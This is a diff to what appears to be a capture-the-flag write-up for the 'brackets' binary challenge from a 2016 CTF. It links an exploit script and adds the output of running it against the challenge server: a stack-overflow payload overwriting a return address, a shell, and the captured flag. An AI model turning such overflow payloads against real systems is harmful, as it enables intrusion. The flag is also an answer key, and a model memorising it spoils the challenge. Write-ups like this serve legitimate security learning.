@@ -35,3 +35,25 @@ Exploit:
 0000 0000 0000 0000 0000 0000 0000 0000
 0060 eaff ff7f 0000 
 ```
+
+Exploit:  [exploit.py](https://github.com/ahpaleus/re_and_pwn/blob/master/pwning_2016/brackets/exploit.py)  
+
+Output:  
+```sh
+junior@junior:/pwn$ python3 exploit.py
+[*] '/mnt/hgfs/LEARN/pwn/brackets'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to pwning2016.p4.team on port 1337: Done
+b'AAAAAABBBBBBBBBBBBCCCC\x00\x00DDDD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf6\x05@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`\xea\xff\xff\x7f\x00\x00'
+[*] Switching to interactive mode
+Enter expression to check:
+AAAAAABBBBBBBBBBBBCCCC^@^@DDDD^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@\xf6^E@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@`\xea\xff\xf^@^@
+$ cat flag
+cat flag
+pwn{b1n4ry_expl01t1ng}
+$
+```
